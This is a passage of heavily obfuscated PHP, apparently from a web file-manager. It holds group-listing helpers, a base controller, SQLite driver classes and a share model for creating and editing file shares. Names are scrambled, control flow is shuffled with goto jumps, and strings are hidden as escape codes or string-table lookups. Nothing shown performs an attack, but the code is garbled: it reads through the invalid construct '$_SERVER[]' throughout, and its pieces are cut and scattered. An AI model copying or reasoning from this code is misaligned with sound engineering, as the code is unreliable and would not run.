$this->_listAppendMeta($a, $Bٺ); goto E꿏; F: } private function _listAppendChildren(&$FΩ) { goto A; B: $fձ = count($FΩ); $D = $this->tablePrefix . $this->tableName; for ($fɎ = 0, $Fױ = 0; $fɎ < $fձ; $fɎ++) { $Fױ++; $EǗ = $FΩ[$fɎ][$A[2108]]; $D׉ .= "\123\105\114\105\103\x54\40\x2a\x20\106\122\117\x4d\40\50\123\x45\x4c\x45\x43\x54\x20\47{$EǗ}\x5f\x63\150\x69\x6c\144\47\40\x61\163\40\x68\141\163\40\x46\122\x4f\115\40\x60{$D}\140\x20\167\150\x65\162\145\x20\x70\141\x72\145\156\x74\111\x44\x3d{$EǗ}\40\154\x69\x6d\151\x74\40\x31\x29\x20\141\163\x20\x74\142\x5f{$EǗ}\x20\x75\156\x69\157\156\40\141\154\154\40"; if (($Fױ >= 20 || $fɎ == $fձ - 1) && $D׉) { $D׉ = substr($D׉, 0, -strlen($A[451])); $bš = $this->query($D׉); $e = array_merge($e, $bš); $Fױ = 0; $D׉ = $A[33]; } } goto Eث; A: $A =& $_SERVER[]; $D׉ = $A[361]; $e = array(); goto B; Eث: $e = array_to_keyvalue($e, $A[452]); foreach ($FΩ as &$b) { $b[$A[2195]] = isset($e[$b[$A[2108]] . $A[2196]]); } goto Eʖ; Eʖ: } private function _listAppendChildrenMember(&$D) { goto F镰; cޚ: $f· = array_to_keyvalue($f·, $Dǵ[452]); foreach ($D as &$Cܭ) { $Cܭ[$Dǵ[2197]] = isset($f·[$Cܭ[$Dǵ[2108]] . $Dǵ[2196]]); } goto CՖړ; F镰: $Dǵ =& $_SERVER[]; $EӲ = $Dǵ[361]; $f· = array(); goto cŉ; cŉ: $E = count($D); $f = $this->tablePrefix . $Dǵ[2187]; for ($E󵲂 = 0, $Aʾ = 0; $E󵲂 < $E; $E󵲂++) { $Aʾ++; $A⫾ = $D[$E󵲂][$Dǵ[2108]]; $EӲ .= "\123\105\114\105\x43\124\x20\52\x20\x46\122\117\x4d\40\50\123\x45\114\105\103\124\x20\x27{$A⫾}\x5f\x63\150\x69\154\x64\47\x20\141\163\x20\x68\141\x73\40\x46\x52\117\115\40\140{$f}\140\40\x77\150\145\162\x65\x20\147\x72\157\165\x70\x49\104\x3d{$A⫾}\40\x6c\151\x6d\x69\164\40\61\51\40\x61\x73\40\164\x62\137{$A⫾}\x20\x75\156\x69\157\x6e\x20\141\154\154\x20"; if (($Aʾ >= 20 || $E󵲂 == $E - 1) && $EӲ) { $EӲ = substr($EӲ, 0, -strlen($Dǵ[451])); $E = $this->query($EӲ); $f· = array_merge($f·, $E); $Aʾ = 0; $EӲ = $Dǵ[33]; } } goto cޚ; CՖړ: } private function _listAppendMeta(&$f, $AނƂ) { $aֵ =& $_SERVER[]; $a = array($aֵ[2108] => array($aֵ[7], $AނƂ)); $EҾՇ = Model($aֵ[2186])->where($a)->select(); $EҾՇ = array_to_keyvalue_group($EҾՇ, $aֵ[2108]); foreach ($EҾՇ as &$A) { $A = array_to_keyvalue($A, $aֵ[89], $aֵ[359]); } foreach ($f as &$dإ) { $dإ[$aֵ[417]] = array(); if (isset($EҾՇ[$dإ[$aֵ[2108]]])) { $dإ[$aֵ[417]] = $EҾՇ[$dإ[$aֵ[2108]]]; } } } protected function parentLevelArray($B) { $CЧ =& $_SERVER[]; $B = explode($CЧ[47], trim($B, $CЧ[47])); $B = array_remove_value($B, $CЧ[470]); return $B; } private function _listAppendParent(&$b˧) { goto d޵; aې׷: $Ē = $GLOBALS[$d[6]][$d[84]][$d[2199]]; foreach ($b˧ as &$C܍Ñ) { $c޵ = $this->parentLevelArray($C܍Ñ[$d[461]]); $B = $d[33]; foreach ($c޵ as $B쫚 => $a֦) { if ($Ē && $B쫚 == 0) { continue; } $B .= $a˯Ă[$a֦] . $d[8]; } if ($c޵) { $B .= $C܍Ñ[$d[28]]; } $C܍Ñ[$d[465]] = str_replace($d[469], $d[8], $B); } goto e΍џ; d޵: $d =& $_SERVER[]; $a˯Ă = array(); foreach ($b˧ as &$C܍Ñ) { $a˯Ă[$C܍Ñ[$d[2108]]] = $C܍Ñ[$d[28]]; $c޵ = $this->parentLevelArray($C܍Ñ[$d[461]]); foreach ($c޵ as $a֦) { if (!isset($a˯Ă[$a֦])) { $a˯Ă[$a֦] = 0; } } } goto C豧; C豧: $B = array(); foreach ($a˯Ă as $B쫚 => $CҚ) { if (!$CҚ) { $B[] = $B쫚; } } if ($B) { $DԈ掆 = array($d[2185] => array($d[384], $B)); $Dޥ = $this->field($d[2198])->where($DԈ掆)->select(); $A؆ = array_to_keyvalue($Dޥ, $d[2108], $d[28]); $a˯Ă = array_merge_index($a˯Ă, $A؆); } goto aې׷; e΍џ: } private function _listAppendSourceRoot(&$cꌺŌ, $Aɹ) { goto eŊ; b: $c = Model($EÜ[751])->order($EÜ[2201])->field($b)->where($D؝)->select(); $c = array_to_keyvalue($c, $EÜ[458]); $c = array_remove_key($c, $EÜ[458]); goto AƝ; AƝ: foreach ($cꌺŌ as &$a虜) { $a虜[$EÜ[391]] = $c[$a虜[$EÜ[2108]]] ? $c[$a虜[$EÜ[2108]]] : array(); } goto dꢐ˜; eŊ: $EÜ =& $_SERVER[]; $D؝ = array($EÜ[371] => SourceModel::TYPE_GROUP, $EÜ[463] => 0, $EÜ[458] => array($EÜ[7], $Aɹ)); $b = $EÜ[2200]; goto b; dꢐ˜: } protected function groupMerge($eʡ) { $eʡ = array_values(array_unique($eʡ)); $C҈ = array(); for ($a͘誄 = 0; $a͘誄 < count($eʡ); $a͘誄++) { $BƑ = !1; for ($fԘ = 0; $fԘ < count($eʡ); $fԘ++) { if ($a͘誄 == $fԘ) { continue; } if ($this->isParentOf($eʡ[$fԘ], $eʡ[$a͘誄])) { $BƑ = !0; break; } } if (!$BƑ) { $C҈[] = $eʡ[$a͘誄]; } } return $C҈; } protected function isParentOf($c, $d) { goto d; d: $dá =& $_SERVER[]; if (!$c || !$d || $c == $d) { return !1; } $fŘގ = $this->getInfoSimple($c); goto F; bű: return !1; goto e; F: $Cȋ = $this->getInfoSimple($d); $BԎČ = $fŘގ[$dá[461]] . $c . $dá[47]; if (substr($Cȋ[$dá[461]], 0, strlen($BԎČ)) == $BԎČ) { return !0; } goto bű; e: } public function groupShowRoot($Bʫ, $bЇ = false) { goto Dζ׻; Dζ׻: $f־ =& $_SERVER[]; $B߬ = $this->getInfo($Bʫ); $D = $this->parentLevelArray($B߬[$f־[461]]); goto D; d䫇: if (!$B߬[$f־[417]] || !isset($B߬[$f־[417]][$f־[2183]]) || $B߬[$f־[417]][$f־[2183]] == $f־[2156]) { return $this->groupShowRoot($D[count($D) - 1], $bЇ); } if ($B߬[$f־[417]][$f־[2183]] == $f־[346]) { $d = explode($f־[47], $B߬[$f־[417]][$f־[2184]]); if ($d) { $aѨ = array_merge($aѨ, $d); } } return $aѨ; goto F޹; D: $aѨ = array($Bʫ); if (count($D) == 0) { return $aѨ; } if ($bЇ && count($D) == 1) { return $aѨ; } goto d䫇; F޹: } protected function resetParentLevel() { $C徂ξ =& $_SERVER[]; $e = $C徂ξ[2108]; $C͏㞻ޑ = $this->select(); $C͏㞻ޑ = array_to_keyvalue($C͏㞻ޑ, $e); foreach ($C͏㞻ޑ as $bƏ) { goto D; D: $F㿺 = $bƏ; $Dݯ = array(); while ($F㿺[$C徂ξ[463]] != 0) { $Dݯ[] = $F㿺[$C徂ξ[463]]; $F㿺 = $C͏㞻ޑ[$F㿺[$C徂ξ[463]]]; } goto aѝ; aѝ: $Dݯ[] = 0; $Dݯ = $C徂ξ[47] . implode($C徂ξ[47], array_reverse($Dݯ)) . $C徂ξ[47]; $this->setNamePinyin($bƏ[$e], $bƏ[$C徂ξ[28]]); goto Eɑ; Eɑ: $this->where(array($e => $bƏ[$e]))->save(array($C徂ξ[527] => $Dݯ)); goto f织; f织: } return $C͏㞻ޑ; } public function groupNameAuto($fا, $eܪө) { $b論 =& $_SERVER[]; $F؇ = $this->where(array($b論[368] => $fا))->getField($b論[28], !0); if (!$F؇ || !in_array($eܪө, $F؇)) { return $eܪө; } for ($fůɔ = 1; $fůɔ <= count($F؇) + 1; $fůɔ++) { $d֭ = $eܪө . "\x28{$fůɔ}\x29"; if (!in_array($d֭, $F؇)) { return $d֭; } } } } goto a; E: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto a; fŘ: $this->tpl = TEMPLATE . MOD . $Cϣ岢[8]; $this->_classObjectID = mt_rand(0, 10000); goto eΚ; a: $Cϣ岢 =& $_SERVER[]; global $in, $config; $this->config =& $config; goto fɶ; fɶ: $this->in =& $in; $this->values[$Cϣ岢[6]] =& $config; $this->values[$Cϣ岢[7]] =& $in; goto fŘ; eΚ: } public function loadClass($bج) { if (1 === func_num_args()) { $this->{$bج} = new $bج(); } else { $f = new ReflectionClass($bج); $CㆰΘ = func_get_args(); array_shift($CㆰΘ); $this->{$bج} = $f->newInstanceArgs($CㆰΘ); } return $this->{$bج}; } protected function assign($Eݤ, $eӣ) { $this->values[$Eݤ] = $eӣ; } protected function display($E܈ݼ) { ob_end_clean(); extract($this->values); require $this->tpl . $E܈ݼ; } } class DbSqliteBase extends Db { public function __construct($Eҡʋ = '') { $aԈא =& $_SERVER[]; if (!extension_loaded($aԈא[9])) { think_exception(think_lang($aԈא[10]) . $aԈא[11]); } if (!empty($Eҡʋ)) { if (!isset($Eҡʋ[$aԈא[12]])) { $Eҡʋ[$aԈא[12]] = 438; } $this->config = $Eҡʋ; if (empty($this->config[$aԈא[13]])) { $this->config[$aԈא[13]] = array(); } } } public function connect($F̠ = '', $cǋ = 0) { $B =& $_SERVER[]; if (!isset($this->linkID[$cǋ])) { goto F; Bȥ: @sqlite_busy_timeout($this->linkID[$cǋ], 30000); if (1 != think_config($B[18])) { unset($this->config); } goto fΤ; Bú: $this->linkID[$cǋ] = $C($F̠[$B[17]], $F̠[$B[12]]); if (!$this->linkID[$cǋ]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Bȥ; F: if (empty($F̠)) { $F̠ = $this->config; } $D篿鈳 = !empty($F̠[$B[13]][$B[14]]) ? $F̠[$B[13]][$B[14]] : $this->pconnect; $C = $D篿鈳 ? $B[15] : $B[16]; goto Bú; fΤ: } return $this->linkID[$cǋ]; } public function free() { $this->queryID = null; } public function query($B) { goto Dϰ; B: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Dҭ = $this->getAll(); return $Dҭ; } goto A; Dһ葇: think_status($F΅[20]); $this->queryID = sqlite_query($this->_linkID, $B); $this->debug(); goto B; fҜޱ: $this->queryStr = $B; if ($this->queryID) { $this->free(); } think_action_status($F΅[19], 1); goto Dһ葇; Dϰ: $F΅ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fҜޱ; A: } public function execute($a) { goto cݘф; Cџ߇ח: think_status($c[20]); $E = sqlite_exec($this->_linkID, $a); $this->debug(); goto Eה; Bȩ: $this->queryStr = $a; if ($this->queryID) { $this->free(); } think_action_status($c[21], 1); goto Cџ߇ח; cݘф: $c =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Bȩ; Eה: if (!1 === $E) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto C٥; C٥: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $cޝ = sqlite_query($this->_linkID, $_SERVER[][23]); if (!$cޝ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e = sqlite_query($this->_linkID, $_SERVER[][24]); if (!$e) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $BھՊ = array(); if ($this->numRows > 0) { for ($cԔ = 0; $cԔ < $this->numRows; $cԔ++) { $BھՊ[$cԔ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $BھՊ; } public function getFields($f) { $EӾ =& $_SERVER[]; $a = $this->query($EӾ[25] . $f . $EӾ[26]); $BІ = array(); if ($a) { foreach ($a as $a⒘ => $a犓) { $BІ[$a犓[$EӾ[27]]] = array($EӾ[28] => $a犓[$EӾ[27]], $EӾ[29] => $a犓[$EӾ[30]], $EӾ[31] => (bool) ($a犓[$EӾ[32]] === $EӾ[33]), $EӾ[34] => $a犓[$EӾ[35]], $EӾ[36] => strtolower($a犓[$EӾ[37]]) == $EӾ[38], $EӾ[39] => strtolower($a犓[$EӾ[40]]) == $EӾ[41]); } } return $BІ; } public function getTables($C = '') { $eأ =& $_SERVER[]; $fﲞʫ = $this->query($eأ[42] . $eأ[43] . $eأ[44]); $BŃ = array(); foreach ($fﲞʫ as $Cݿ => $Cٔ) { $BŃ[$Cݿ] = current($Cٔ); } return $BŃ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $e =& $_SERVER[]; $fڼ = sqlite_last_error($this->_linkID); $this->error = $fڼ . $e[4] . sqlite_error_string($fڼ); if ($e[33] != $this->queryStr) { $this->error .= LNG($e[45]) . $this->queryStr; } think_trace($this->error, $e[33], $e[46]); return $this->error; } public function escapeString($E֜) { return sqlite_escape_string($E֜); } public function parseLimit($Cߨ) { $C鴭 =& $_SERVER[]; $e栦 = $C鴭[33]; if (!empty($Cߨ)) { $Cߨ = explode($C鴭[47], $Cߨ); if (count($Cߨ) > 1) { $e栦 .= $C鴭[48] . $Cߨ[1] . $C鴭[49] . $Cߨ[0] . $C鴭[50]; } else { $e栦 .= $C鴭[48] . $Cߨ[0] . $C鴭[50]; } } return $e栦; } } class DbSqlite3Base extends Db { public function __construct($A = '') { $E⍮ =& $_SERVER[]; if (!class_exists($E⍮[51])) { think_exception(think_lang($E⍮[10]) . $E⍮[52]); } if (!empty($A)) { if (!isset($A[$E⍮[12]])) { $A[$E⍮[12]] = 438; } $this->config = $A; if (empty($this->config[$E⍮[13]])) { $this->config[$E⍮[13]] = array(); } } } public function connect($c˽ = '', $FПГ = 0) { $c =& $_SERVER[]; if (!isset($this->linkID[$FПГ])) { if (empty($c˽)) { $c˽ = $this->config; } $this->linkID[$FПГ] = new SQLite3($c˽[$c[17]]); if (!$this->linkID[$FПГ]) { think_exception($this->linkID[$FПГ]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$FПГ]->busyTimeout(30000); if (1 != think_config($c[18])) { unset($this->config); } } return $this->linkID[$FПГ]; } public function free() { $this->queryID = null; } public function query($a) { goto d; Dáԥ: think_status($b⏒ܪ[20]); $this->queryID = $this->_linkID->query($a); $this->debug(); goto c賑; c賑: if (!1 === $this->queryID) { $this->error(); return !1; } else { $e = $this->getAll(); $this->numRows = count($e); return $e; } goto D֗; d: $b⏒ܪ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Eܪ; Eܪ: $this->queryStr = $a; if ($this->queryID) { $this->free(); } think_action_status($b⏒ܪ[19], 1); goto Dáԥ; D֗: } public function execute($d) { goto BѶ; bϲ: if (!1 === $e) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto eؿ; BѶ: $c东 =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fв; B훊: think_status($c东[20]); $e = $this->_linkID->exec($d); $this->debug(); goto bϲ; Fв: $this->queryStr = $d; if ($this->queryID) { $this->free(); } think_action_status($c东[21], 1); goto B훊; eؿ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fܸ¨ = $this->_linkID->query($_SERVER[][23]); if (!$fܸ¨) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $CƄ = $this->_linkID->query($_SERVER[][24]); if (!$CƄ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $d = array(); while ($Eն = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $d[] = $Eն; } $this->queryID->reset(); return $d; } public function getFields($f) { $f҈ =& $_SERVER[]; $Bˤӝ = $this->query($f҈[25] . $f . $f҈[26]); $d = array(); if ($Bˤӝ) { foreach ($Bˤӝ as $E => $DϬ) { $d[$DϬ[$f҈[28]]] = array($f҈[28] => $DϬ[$f҈[28]], $f҈[29] => $DϬ[$f҈[29]], $f҈[31] => (bool) ($DϬ[$f҈[31]] === $f҈[33]), $f҈[34] => $DϬ[$f҈[53]], $f҈[36] => (bool) $DϬ[$f҈[54]], $f҈[39] => (bool) $DϬ[$f҈[54]]); } } return $d; } public function getTables($D߿ = '') { $F =& $_SERVER[]; $fֵ̢ = $this->query($F[42] . $F[43] . $F[44]); $f = array(); foreach ($fֵ̢ as $A => $Cݑ) { $f[$A] = current($Cݑ); } return $f; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $c݄ =& $_SERVER[]; $this->error = $this->_linkID->lastErrorMsg(); if ($c݄[33] != $this->queryStr) { $this->error .= LNG($c݄[45]) . $this->queryStr; } think_trace($this->error, $c݄[33], $c݄[46]); return $this->error; } public function escapeString($AƩ) { $Dѵњ =& $_SERVER[]; if ($this->_linkID) { return $this->_linkID->escapeString($AƩ); } return str_ireplace($Dѵњ[55], $Dѵњ[56], $AƩ); } public function parseLimit($f싒) { $F =& $_SERVER[]; $f = $F[33]; if (!empty($f싒)) { $f싒 = explode($F[47], $f싒); if (count($f싒) > 1) { $f .= $F[48] . $f싒[1] . $F[49] . $f싒[0] . $F[50]; } else { $f .= $F[48] . $f싒[0] . $F[50]; } } return $f; } } goto dً; a: class ShareModel extends ModelBase { protected $tableName = "\x73\x68\141\162\145"; protected $dataAuto = array(array("\155\x6f\x64\x69\146\171\x54\x69\x6d\145", "\x74\x69\x6d\x65", "\x69\156\x73\145\x72\x74\54\165\160\144\141\164\x65", "\x66\x75\156\x63\x74\151\157\x6e"), array("\143\162\x65\141\164\145\124\x69\x6d\145", "\x74\151\155\x65", "\151\x6e\163\145\x72\164", "\146\x75\x6e\143\164\151\157\x6e"), array("\x6f\x70\x74\151\157\156\x73", '', "\x69\x6e\x73\145\x72\x74\x2c\x75\160\144\141\x74\x65\54\163\145\x6c\x65\x63\164", "\152\163\x6f\156")); private $fieldList = "\52"; protected function cacheFunctionAlias($C) { $fઉس =& $_SERVER[]; $dü = isset($C[0]) ? $C[0] : !1; return array($fઉس[2230] => array(USER_ID, $fઉس[2231]), $fઉس[2179] => array($dü, $fઉس[2232])); } protected function listSimple() { $eÄ = array($_SERVER[][1437] => USER_ID); $B쉂 = $this->field($this->fieldList)->where($eÄ)->select(); return $B쉂 ? $B쉂 : array(); } protected function getInfo($bӓ, $b = false) { $C =& $_SERVER[]; if ($b) { return $this->_getShareInfo(array($C[441] => $bӓ)); } $dיƐ = $this->cacheFunctionGet($C[2233], $bӓ); return $dיƐ; } public function getInfoByHash($f狟) { return $this->_getShareInfo(array($_SERVER[][443] => $f狟)); } public function getInfoByPath($Aʐµ) { $aϑ =& $_SERVER[]; $bש = array($aϑ[1437] => USER_ID, $aϑ[369] => $Aʐµ); return $this->_getShareInfo($bש); } public function getInfoBySourcePath($eѮ) { $CмͶ =& $_SERVER[]; $F˒ = array($CмͶ[1437] => USER_ID, $CмͶ[1021] => $eѮ); return $this->_getShareInfo($F˒); } private function _getShareInfo($d׫) { goto E뇲; E뇲: $cʏ =& $_SERVER[]; $fҐ = $this->where($d׫)->find(); if (!$fҐ) { return !1; } goto Fס; Fڨ: if ($fҐ[$cʏ[369]] == $cʏ[470]) { $fҐ[$cʏ[391]] = IO::info($fҐ[$cʏ[1021]]); } else { $fҐ[$cʏ[391]] = Model($cʏ[1119])->pathInfo($fҐ[$cʏ[369]]); } $fҐ[$cʏ[2235]] = $b͚Ͱ; return $fҐ; goto bɴݦ; Fס: $d׫ = array($cʏ[441] => $fҐ[$cʏ[441]]); $eֱ = $cʏ[2234]; $b͚Ͱ = Model($cʏ[539])->order($cʏ[367])->field($eֱ)->where($d׫)->select(); goto Fڨ; bɴݦ: } protected function getInfoAuth($CĽ) { $eƤĻ =& $_SERVER[]; $b = $this->getInfo($CĽ); $b[$eƤĻ[376]] = Model($eƤĻ[456])->authMake($b[$eƤĻ[2235]]); return $b; } protected function listData($a㐛ڄ = null, $b͔ = 300) { $Dșꋼ =& $_SERVER[]; $D = array(array($Dșꋼ[446] => array($Dșꋼ[927], 0), $Dșꋼ[448] => array($Dșꋼ[927], 0), $Dșꋼ[2236] => $Dșꋼ[2193])); if ($a㐛ڄ == $Dșꋼ[1874]) { $D = array($Dșꋼ[446] => 1); } else { if ($a㐛ڄ == $Dșꋼ[1010]) { $D = array($Dșꋼ[448] => 1); } } $D[$Dșꋼ[1437]] = USER_ID; $c݊ = $this->where($D)->selectPage($b͔); return $c݊; } protected function listToMe($f橲 = 300) { goto Dގ; C眣: $aն = array($d[2239] => $Fԭ, $d[2240] => $fО[$d[351]]); return $aն; goto f; Dގ: $d =& $_SERVER[]; $D˱ = Session::get($d[2237]); $F = array_to_keyvalue($D˱, $d[33], $d[2108]); goto DΌ; b: $eػ = array_to_keyvalue_group($fО[$d[354]], $d[441]); if (!$eػ) { return $fО; } $d೑ = $d[2238]; goto dǅھމ; DΌ: $dǖ܃ = array($d[523] => SourceModel::TYPE_USER, $d[458] => USER_ID); if ($F) { $dǖ܃ = array(array($d[523] => SourceModel::TYPE_USER, $d[458] => USER_ID), array($d[523] => SourceModel::TYPE_GROUP, $d[458] => array($d[7], $F)), $d[2236] => $d[2193]); } $fО = Model($d[539])->where($dǖ܃)->selectPage($f橲); goto b; dǅھމ: $dǖ܃ = array($d[441] => array($d[384], array_keys($eػ))); $Fԭ = $this->field($d೑)->where($dǖ܃)->select(); foreach ($Fԭ as $d̸َ => &$dݑ) { $dݑ[$d[2235]] = $eػ[$dݑ[$d[441]]]; } goto C眣; f: } protected function shareAdd($C, $eԙ) { $Cԍ =& $_SERVER[]; $Eʃ = $this->_addShareData($C, $eԙ); if (!empty($eԙ[$Cԍ[2241]])) { $this->_shareAuthSet($Eʃ, $eԙ[$Cԍ[2241]]); } $this->shareEventAdd($C, $eԙ, $Cԍ[1013]); return $Eʃ; } private function shareEventAdd($dՑ, $E˧Ɉ, $aƧ = "\141\x64\x64") { goto b; A۹ð: return; goto c; cӮ: if ($d݋[$b[448]] == $b[470] && $E˧Ɉ[$b[448]] == $b[83]) { $d = $b[2243]; } if ($d݋[$b[448]] == $b[83] && $E˧Ɉ[$b[448]] == $b[470]) { $d = $b[2246]; } Model($b[507])->eventShare($dՑ, $d); goto A۹ð; Cْ: $d = $b[2244]; if ($d݋[$b[446]] == $b[470] && $E˧Ɉ[$b[446]] == $b[83]) { $d = $b[2242]; } if ($d݋[$b[446]] == $b[83] && $E˧Ɉ[$b[446]] == $b[470]) { $d = $b[2245]; } goto cӮ; b: $b =& $_SERVER[]; if ($aƧ == $b[1013]) { if ($E˧Ɉ[$b[446]] == $b[83]) { Model($b[507])->eventShare($dՑ, $b[2242]); } if ($E˧Ɉ[$b[448]] == $b[83]) { Model($b[507])->eventShare($dՑ, $b[2243]); } return; } $d݋ = $this->getInfoByPath($dՑ); goto Cْ; c: } private function _addShareData($Aʠ, $eн = array()) { goto Aа㬯; B: return $A; goto CĴ; bώ: if ($BѶ = $this->where($F)->find()) { return $BѶ[$Eţ[441]]; } if ($Aʠ == 0) { $D = array($Eţ[28] => get_path_this($eн[$Eţ[75]])); } else { $D = Model($Eţ[751])->sourceInfo($Aʠ); if (!$D) { return !1; } } if (!$eн[$Eţ[1343]]) { $eн[$Eţ[1343]] = $D[$Eţ[28]]; } goto d; d: $Eێ = array($Eţ[1428] => USER_ID, $Eţ[383] => $Aʠ, $Eţ[1343] => $Eţ[33], $Eţ[446] => 0, $Eţ[448] => 0, $Eţ[1021] => $Eţ[33], $Eţ[295] => $Eţ[33], $Eţ[803] => $Eţ[33], $Eţ[2248] => 0, $Eţ[2249] => 0, $Eţ[449] => 0, $Eţ[450] => $Eţ[33], $Eţ[443] => $Eţ[33]); $cȲ˹ = explode($Eţ[47], $Eţ[2250]); foreach ($cȲ˹ as $F킓) { if (!isset($eн[$F킓])) { continue; } $Eێ[$F킓] = $eн[$F킓]; } goto BԎÜ; Aа㬯: $Eţ =& $_SERVER[]; $F = array($Eţ[383] => $Aʠ, $Eţ[1428] => USER_ID); if ($Aʠ == 0) { $F = array($Eţ[2247] => $eн[$Eţ[1021]], $Eţ[1428] => USER_ID); } goto bώ; BԎÜ: $A = $this->add($Eێ); $B҃ = array($Eţ[443] => short_id($A)); $this->where(array($Eţ[440] => $A))->save($B҃); goto B; CĴ: } private function _shareAuthSet($d׏, $AƄ) { goto Eǵ; Cቌ: return $aٖ->addAll($d, array(), !0); goto Fڟ鄥; EȆ: $aٖ->where(array($e籑ɤ[441] => $d׏))->delete(); $d = array(); foreach ($AƄ as $F̸횆) { $d = SourceModel::TYPE_USER; if ($F̸횆[$e籑ɤ[371]] == SourceModel::TYPE_GROUP) { $d = SourceModel::TYPE_GROUP; } $fȉ = array($e籑ɤ[441] => $d׏, $e籑ɤ[371] => $d, $e籑ɤ[458] => intval($F̸횆[$e籑ɤ[458]]), $e籑ɤ[2252] => 0, $e籑ɤ[2253] => -1); if ($F̸횆[$e籑ɤ[2252]]) { $fȉ[$e籑ɤ[2252]] = $F̸횆[$e籑ɤ[2252]]; } else { if ($F̸횆[$e籑ɤ[2253]]) { $fȉ[$e籑ɤ[2253]] = $F̸횆[$e籑ɤ[2253]]; } } $d[] = $fȉ; } goto Cቌ; Eǵ: $e籑ɤ =& $_SERVER[]; if (!is_array($AƄ)) { return !1; } $aٖ = Model($e籑ɤ[2251]); goto EȆ; Fڟ鄥: } public function numViewAdd($e) { $E콂Ɛ =& $_SERVER[]; $e = array($E콂Ɛ[440] => $e); $this->where($e)->setAdd($E콂Ɛ[2248]); } public function numDownloadAdd($D) { $F =& $_SERVER[]; $d = array($F[440] => $D); $this->where($d)->setAdd($F[2249]); } protected function shareEdit($Aɰ, $d䟒) { goto Fȟý; Fȟý: $eӧ =& $_SERVER[]; $b䆳 = $this->getInfo($Aɰ); if (!$b䆳) { return !1; } goto aغ; eނ: foreach ($fӖ as $Aփٱ) { if (!array_key_exists($Aփٱ, $d䟒)) { continue; } $BوĤ[$Aփٱ] = $d䟒[$Aփٱ]; } $this->shareEventAdd($b䆳[$eӧ[369]], $d䟒, $eӧ[2075]); $this->where(array($eӧ[440] => $Aɰ))->save($BوĤ); goto aװ; aװ: if (isset($d䟒[$eӧ[2241]])) { $this->_shareAuthSet($Aɰ, $d䟒[$eӧ[2241]]); } return !0; goto a; aغ: $this->_checkLinkShare($d䟒, $b䆳); $BوĤ = array(); $fӖ = explode($eӧ[47], $eӧ[2254]); goto eނ; a: } private function _checkLinkShare($E냋, $aዲ) { goto Aɭ; Aɭ: $Aʲ =& $_SERVER[]; if ($E냋[$Aʲ[446]] != $Aʲ[83]) { return; } $Aኌ = $aዲ[$Aʲ[391]][$Aʲ[369]]; goto e; a: $fԲҔ = $this->shareFileMeta($Bݱʘ[$Aʲ[419]]); if (isset($fԲҔ[$Aʲ[359]]) && $fԲҔ[$Aʲ[359]] == $Aʲ[83]) { show_json(LNG($Aʲ[2257]), !1); } goto c⃜; e: if ($aዲ[$Aʲ[391]][$Aʲ[29]] != $Aʲ[167]) { $eߡ = $this->_folderReport($Aኌ); if (!$eߡ) { return; } show_json(LNG($Aʲ[2255]) . $Aʲ[2256] . $eߡ, !1); } $Bݱʘ = Model($Aʲ[751])->fileInfoGet($aዲ[$Aʲ[391]][$Aʲ[369]]); if (!$Bݱʘ) { return; } goto a; c⃜: } private function _folderReport($DǼ̝) { goto e; dΌ: $A݄ = array_to_keyvalue($Aᔧ, $D㨯[33], $D㨯[28]); $A݄[] = $dȌ[$D㨯[28]]; return implode($D㨯[8], $A݄); goto B̔ϐ; bه: if (!$D޵) { return !1; } $D޵ = array_to_keyvalue($D޵, $D㨯[33], $D㨯[419]); $Dֈĭ = $D㨯[47] . $DǼ̝ . $D㨯[47]; goto b; b: $dޏ = array($D㨯[419] => array($D㨯[7], $D޵), $D㨯[461] => array($D㨯[750], "\x25{$Dֈĭ}\45"), $D㨯[397] => 0); $dȌ = Model($D㨯[751])->where($dޏ)->field($D㨯[2259])->find(); if (!$dȌ) { return !1; } goto AƇ; AƇ: $C͡ˉ = substr($dȌ[$D㨯[461]], strpos($dȌ[$D㨯[461]], $Dֈĭ)); $dޏ = array($D㨯[369] => array($D㨯[7], trim($C͡ˉ, $D㨯[47]))); $Aᔧ = Model($D㨯[751])->where($dޏ)->field($D㨯[28])->select(); goto dΌ; e: $D㨯 =& $_SERVER[]; $dޏ = array($D㨯[419] => array($D㨯[927], 0), $D㨯[688] => 3); $D޵ = Model($D㨯[2258])->where($dޏ)->field($D㨯[419])->select(); goto bه; B̔ϐ: } protected function remove($Bŉ) { goto D񰎌; EƐ: $d߃ԏ = $this->where($Aƅ)->delete(); if ($d߃ԏ) { Model($aۯ[539])->where(array($aۯ[441] => $Bŉ))->delete(); } $fۑ = is_array($Bŉ) ? $Bŉ[1] : array($Bŉ); goto f׎; D񰎌: $aۯ =& $_SERVER[]; if (is_array($Bŉ)) { $Bŉ = array($aۯ[7], $Bŉ); } $Aƅ = array($aۯ[441] => $Bŉ); goto EƐ; 